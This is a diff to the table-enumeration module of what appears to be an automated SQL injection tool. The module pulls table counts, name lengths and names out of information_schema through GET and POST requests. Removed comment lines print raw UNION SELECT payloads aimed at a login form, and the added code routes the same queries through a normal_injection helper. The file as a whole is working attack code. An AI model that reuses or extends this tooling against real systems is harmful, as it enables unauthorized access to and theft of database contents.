@@ -6,6 +6,7 @@ from database import SqliDatabases
 from tqdm import trange
 from lib.dealpayload import build_injection
 from lib.dealpayload import time_injection
+from lib.dealpayload import normal_injection
 
 __author__ = "LoRexxar"
 
@@ -36,11 +37,14 @@ class SqliTables(SqliDatabases):
                     logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                     logger.debug("Start table amount sqli...")
                     # 先注tables的数量
-                    # payload = "user=ddog123' union SELECT 1,COUNT(*) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1%23&passwd=ddog123&submit=Log+In"
-                    payload = self.dealpayload.construct_normal_payload(select="COUNT(*)",
-                                                                        source="information_schema.tables", conditions="table_schema = '" + database_name + "'")
-                    r = self.Data.GetData(payload)
-                    tables_number = int(UnpackFunction(r))
+
+                    tables_number = normal_injection(select='COUNT(*)',
+                                                     source="information_schema.tables",
+                                                     conditions="table_schema = '" + database_name + "'",
+                                                     dealpayload=self.dealpayload,
+                                                     data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                     )
+
                     logger.debug("Table account sqli success...The tables_number is %d..." % tables_number)
                     print "[*] tables_number: %d" % tables_number
 
@@ -48,25 +52,28 @@ class SqliTables(SqliDatabases):
                     for i in trange(int(tables_number), desc="Table sqli...", leave=False, disable=True):
                         # 首先是tablename的长度
                         logger.debug("Start %dth table length sqli..." % (i + 1))
-                        # payload = "user=ddog123' union SELECT 1,length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
-                        payload = self.dealpayload.construct_normal_payload(select="length(table_name)",
-                                                                            source="information_schema.tables",
-                                                                            conditions="table_schema = '" + database_name + "'",
-                                                                            limit=i)
-                        r = self.Data.GetData(payload)
-                        table_name_len = int(UnpackFunction(r))
+
+                        table_name_len = normal_injection(select='length(table_name)',
+                                                          source="information_schema.tables",
+                                                          conditions="table_schema = '" + database_name + "'",
+                                                          limit=i,
+                                                          dealpayload=self.dealpayload,
+                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                          )
+
                         logger.debug("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                         logger.info("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))
 
                         # 然后注tablename
                         logger.debug("Start %dth table name sqli..." % (i + 1))
-                        # payload = "user=ddog123' union SELECT 1,table_name from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
-                        payload = self.dealpayload.construct_normal_payload(select="table_name",
-                                                                            source="information_schema.tables",
-                                                                            conditions="table_schema = '" + database_name + "'",
-                                                                            limit=i)
-                        r = self.Data.GetData(payload)
-                        table_name = UnpackFunction(r)
+
+                        table_name = normal_injection(select='table_name',
+                                                      source='information_schema.tables',
+                                                      conditions="table_schema = '" + database_name + "'", limit=i,
+                                                      dealpayload=self.dealpayload,
+                                                      data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                                      )
+
                         logger.debug("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))
 
                         # 把table_name插入列表
@@ -183,12 +190,14 @@ class SqliTables(SqliDatabases):
                     logger.debug("Start table amount sqli...")
 
                     # 先注tables的数量
-                    # payload = {"user": "ddog' union SELECT 1,COUNT(*) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1#", "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_normal_payload(select="COUNT(table_name)",
-                                                                        source="information_schema.tables",
-                                                                        conditions="table_schema = '" + database_name + "'")
-                    r = self.Data.PostData(payload)
-                    tables_number = int(UnpackFunction(r))
+
+                    tables_number = normal_injection(select='COUNT(*)',
+                                                     source="information_schema.tables",
+                                                     conditions="table_schema = '" + database_name + "'",
+                                                     dealpayload=self.dealpayload,
+                                                     data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                     )
+
                     logger.debug("Table account sqli success...The tables_number is %d..." % tables_number)
                     print "[*] tables_number: %d" % tables_number
 
@@ -196,27 +205,28 @@ class SqliTables(SqliDatabases):
                     for i in trange(int(tables_number), desc="Table sqli...", leave=False, disable=True):
                         # 首先是tablename的长度
                         logger.debug("Start %dth table length sqli..." % (i + 1))
-                        # payload = {"user": "ddog' union SELECT 1,length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
-                        #     i) + ",1#", "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_normal_payload(select="length(table_name)",
-                                                                            source="information_schema.tables",
-                                                                            conditions="table_schema = '" + database_name + "'",
-                                                                            limit=i)
-                        r = self.Data.PostData(payload)
-                        table_name_len = int(UnpackFunction(r))
+
+                        table_name_len = normal_injection(select='length(table_name)',
+                                                          source="information_schema.tables",
+                                                          conditions="table_schema = '" + database_name + "'",
+                                                          limit=i,
+                                                          dealpayload=self.dealpayload,
+                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                          )
+
                         logger.debug("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                         logger.info("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))
 
                         # 然后注tablename
                         logger.debug("Start %dth table name sqli..." % (i + 1))
-                        # payload = {"user": "ddog' union SELECT 1,table_name from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
-                        #     i) + ",1#", "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_normal_payload(select="table_name",
-                                                                            source="information_schema.tables",
-                                                                            conditions="table_schema = '" + database_name + "'",
-                                                                            limit=i)
-                        r = self.Data.PostData(payload)
-                        table_name = UnpackFunction(r)
+
+                        table_name = normal_injection(select='table_name',
+                                                      source='information_schema.tables',
+                                                      conditions="table_schema = '" + database_name + "'", limit=i,
+                                                      dealpayload=self.dealpayload,
+                                                      data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                                      )
+
                         logger.debug("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))
 
                         # 把tables_name插入列表
